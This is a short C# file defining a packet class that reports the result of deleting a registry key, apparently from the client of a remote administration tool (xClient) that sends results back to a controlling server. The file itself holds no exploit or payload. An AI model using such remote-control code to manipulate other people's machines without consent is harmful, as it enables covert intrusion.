using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetDeleteRegistryKeyResponse : IPacket
{
	public string ParentPath { get; set; }

	public string KeyName { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
